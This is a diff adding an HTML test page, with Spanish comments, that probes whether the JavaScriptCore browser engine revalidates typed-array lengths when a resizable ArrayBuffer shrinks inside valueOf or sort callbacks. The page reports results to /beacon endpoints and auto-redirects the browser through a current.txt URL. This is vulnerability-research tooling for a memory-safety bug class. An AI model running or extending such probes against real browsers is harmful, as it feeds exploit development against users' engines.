@@ -1,0 +1,116 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v19-rab — press-10: Resizable ArrayBuffer — revalidación de vistas tras resize</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v19-rab…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v19-rab — press-10, mi diseño (RAB hallado en press-8 S4).
+ * Pregunta CENTRAL: ¿el engine REVALIDA la longitud de una vista
+ * length-tracking cuando el buffer hace resize() DENTRO de un callback
+ * (valueOf/comparador)? Familia de bugs moderna en JSC.
+ * CRASH-SAFE POR DISEÑO: maxByteLength=64 mantiene la reserva mapeada —
+ * si la revalidación falla, la escritura cae DENTRO de la región reservada
+ * (no segfault) y se DETECTA re-creciendo y leyendo bytes 8..63.
+ * Árbol: JSArrayBufferView / TypedArray fill/sort en JSC (re-validation).
+ * 0-crash: todo try-catch, HB 2s, fetch-async, beacons V19-*. */
+var RID="v19r"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V19-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v19-rab; dr="+dr+"; rt="+rt);
+
+/* S1 — RAB básico: resize en ambas direcciones */
+(function(){
+  var m="E",e1="",b1="-",b2="-",b3="-";
+  try{
+    var rab=new ArrayBuffer(8,{maxByteLength:64});
+    b1=String(rab.byteLength);
+    rab.resize(64); b2=String(rab.byteLength);
+    rab.resize(8);  b3=String(rab.byteLength);
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S1","rab="+m+";e="+e1+";b="+b1+"/"+b2+"/"+b3);
+})();
+
+/* S2 — vista length-tracking: ¿view.length sigue al resize en ambas direcciones? */
+(function(){
+  var m="E",e1="",l1="-",l2="-",l3="-",vis="-";
+  try{
+    var rab=new ArrayBuffer(8,{maxByteLength:64});
+    var v=new Uint8Array(rab); /* length-tracking (sin offset/length) */
+    l1=String(v.length);
+    rab.resize(64); l2=String(v.length);
+    try{ v[40]=0xAA; vis=String(v[40]); }catch(e){ vis="E"; }
+    rab.resize(8); l3=String(v.length);
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S2","track="+m+";e="+e1+";len="+l1+"/"+l2+"/"+l3+";v40="+vis);
+})();
+
+/* S3 — ★ EL PROBE ★ fill con valueOf que ENCOGE el buffer a la mitad.
+ * Si el engine cacheó len=64 y NO revalida tras valueOf → escribe 0x41
+ * en bytes 8..63 de la reserva → al re-crecer los leemos → BUG.
+ * Si revalida (spec-ok) → solo 0..7 quedan 0x41 → bytes 8..63 en 0x00. */
+(function(){
+  var m="E",e1="",post="-",len8_63="";
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var v=new Uint8Array(rab);
+    for(var i=0;i<64;i++) v[i]=0;
+    var fired=0;
+    var fillVal={ valueOf:function(){ fired++; try{ rab.resize(8); }catch(e){} return 0x41; } };
+    v.fill(fillVal);           /* ¿len cacheado o revalidado? */
+    var nowLen=v.length;
+    rab.resize(64);            /* re-crece: ¿quedó 0x41 en 8..63? */
+    var w=new Uint8Array(rab), leaked=0;
+    for(var j=8;j<64;j++){ if(w[j]===0x41) leaked++; }
+    len8_63=String(leaked);
+    post="nowLen="+nowLen+";fired="+fired;
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S3","fill="+m+";e="+e1+";"+post+";leaked8_63="+len8_63+(len8_63!=="0"&&len8_63!=="-"?" ★BUG-REVALIDACION":" spec-ok"));
+})();
+
+/* S4 — el mismo patrón con sort: comparador que encoge a la mitad */
+(function(){
+  var m="E",e1="",leaked="-",threw="";
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var v=new Uint8Array(rab);
+    for(var i=0;i<64;i++) v[i]=(i*7)%64; /* contenido mezclado */
+    var fired=0;
+    v.sort(function(a,b){ fired++; if(fired===1){ try{ rab.resize(8); }catch(e){} } return a-b; });
+    rab.resize(64);
+    var w=new Uint8Array(rab), nonZero=0;
+    for(var j=8;j<64;j++){ if(w[j]!==0) nonZero++; }
+    leaked=String(nonZero)+";fired="+fired;
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S4","sort="+m+";e="+e1+";postGrowNonZero8_63="+leaked);
+})();
+
+/* S5 — copyWithin con start valueOf que encoge (tercer vector del mismo patrón) */
+(function(){
+  var m="E",e1="",leaked="-";
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var v=new Uint8Array(rab);
+    for(var i=0;i<64;i++) v[i]=0x11;
+    var fired=0;
+    v.copyWithin(0, { valueOf:function(){ fired++; try{ rab.resize(8); }catch(e){} return 0; } });
+    rab.resize(64);
+    var w=new Uint8Array(rab), non=0;
+    for(var j=8;j<64;j++){ if(w[j]!==0) non++; }
+    leaked=String(non)+";fired="+fired;
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S5","cw="+m+";e="+e1+";postGrowNonZero8_63="+leaked);
+})();
+
+setTimeout(function(){ clearInterval(HB); bk("Z","FA-v19-rab complete; DR_OK="+(rt==="function")+(rt!=="function"?" DRGATE":"")); },1600);
+})();
+</script></body></html>
